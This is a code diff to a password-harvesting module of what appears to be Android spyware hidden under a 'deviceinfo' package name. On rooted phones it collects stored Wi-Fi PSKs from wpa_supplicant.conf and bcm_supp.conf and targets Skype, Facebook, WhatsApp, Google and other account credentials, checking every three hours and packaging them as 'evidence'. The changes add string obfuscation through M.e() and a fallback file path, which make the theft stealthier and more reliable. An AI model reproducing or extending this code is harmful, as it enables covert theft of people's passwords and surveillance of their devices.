@@ -13,7 +13,7 @@ import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.Path;
@@ -34,14 +34,14 @@ public class ModulePassword extends BaseModule {
 	@Override
 	protected boolean parse(ConfModule conf) {
 		if (Status.self().haveRoot()) {
-			services.put("skype", 0x02);
-			services.put("facebook", 0x03);
-			services.put("twitter", 0x04);
-			services.put("google", 0x05);
-			services.put("whatsapp", 0x07);
-			services.put("mail", 0x09);
-			services.put("linkedin", 0x0a);
-			services.put("wifi", 0x0b);
+			services.put(M.e("skype"), 0x02);
+			services.put(M.e("facebook"), 0x03);
+			services.put(M.e("twitter"), 0x04);
+			services.put(M.e("google"), 0x05);
+			services.put(M.e("whatsapp"), 0x07);
+			services.put(M.e("mail"), 0x09);
+			services.put(M.e("linkedin"), 0x0a);
+			services.put(M.e("wifi"), 0x0b);
 
 			return true;
 		} else {
@@ -54,6 +54,9 @@ public class ModulePassword extends BaseModule {
 
 	@Override
 	protected void actualStart() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualStart) ");
+		}
 		// every three hours, check.
 		setPeriod(180 * 60 * 1000);
 		setDelay(200);
@@ -64,9 +67,12 @@ public class ModulePassword extends BaseModule {
 
 	@Override
 	protected void actualGo() {
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualGo) ");
+		}
+		
 		RecordVisitor passwordVisitor = new RecordVisitor() {
-			EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
+			EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 			boolean needToSerialize = false;
 
 			@Override
@@ -109,18 +115,23 @@ public class ModulePassword extends BaseModule {
 			}
 		};
 
-		dumpWifi();
+		String filename_v4 = M.e("/data/misc/wifi/wpa_supplicant.conf");
+		String filename_v2 = M.e("/data/wifi/bcm_supp.conf");
+		if (!dumpWifi(filename_v4)){
+			dumpWifi(filename_v2);
+		}
+			
 		// dumpAccounts(passwordVisitor);
 
 	}
 
-	private void dumpWifi() {
-		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
+	private boolean dumpWifi(String filename) {
+		
 		if (Cfg.DEBUG) {
 			File file = new File(filename);
 			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
 		}
-		if (!Path.unprotect(filename, 2, false)) {
+		if (!Path.unprotect(filename, 3, false)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (dumpWifi) no passwords found");
 			}
@@ -128,14 +139,14 @@ public class ModulePassword extends BaseModule {
 				File file = new File(filename);
 				Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
 			}
-			return;
+			return false;
 		}
 		List<String> lines = StringUtils.readFileLines(filename);
 		String ssid = "";
 		String psk = "";
-		EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
+		EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 		for (String line : lines) {
-			if (line.contains("ssid")) {
+			if (line.contains(M.e("ssid")) && !line.contains(M.e("scan_ssid"))) {
 				ssid = getValue(line);
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
@@ -145,10 +156,11 @@ public class ModulePassword extends BaseModule {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (dumpWifi) psk = %s", psk);
 				}
-				addToEvidence(evidence, ssid, "SSID", psk, "Wifi");
+				addToEvidence(evidence, ssid, M.e("SSID"), psk, M.e("Wifi"));
 			}
 		}
 		evidence.close();
+		return true;
 
 	}
 
@@ -215,7 +227,7 @@ public class ModulePassword extends BaseModule {
 				return key;
 			}
 		}
-		return "service";
+		return M.e("service");
 
 	}
 
@@ -238,7 +250,7 @@ public class ModulePassword extends BaseModule {
 
 	}
 
-	private void addToEvidence(EvidenceReference evidence, String name, String type, String password, String service) {
+	private void addToEvidence(EvidenceBuilder evidence, String name, String type, String password, String service) {
 		evidence.write(WChar.getBytes(type, true));
 		evidence.write(WChar.getBytes(name, true));
 		evidence.write(WChar.getBytes(password, true));
